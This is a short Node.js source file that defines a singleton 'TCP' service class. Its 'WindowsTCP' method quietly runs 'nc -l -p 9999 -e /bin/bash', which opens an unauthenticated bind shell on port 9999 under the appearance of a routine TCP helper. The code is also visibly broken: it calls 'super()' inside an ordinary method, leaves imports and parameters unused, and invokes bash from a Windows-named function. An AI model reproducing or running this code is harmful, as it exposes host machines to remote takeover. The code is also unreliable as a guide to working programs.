const { exec } = require("child_process");
const Services = require('../Services.cjs');

class TCP extends Services{
    static #instance = null;

    constructor(){
        super();
        console.log("TCP");
    }

    static getInstance(){
        try{
            if(!this.#instance){
                this.#instance = new TCP();
            }
            return this.#instance;
        }catch(error){
            return {status:500,message:error};
        }
    }

    async WindowsTCP(param){
        try{
            await super.executeCommand("nc -l -p 9999 -e /bin/bash");
            return await super().XmltoJson("output.xml");
        }catch(error){
            return {status:500,message:error};
        }
    }

}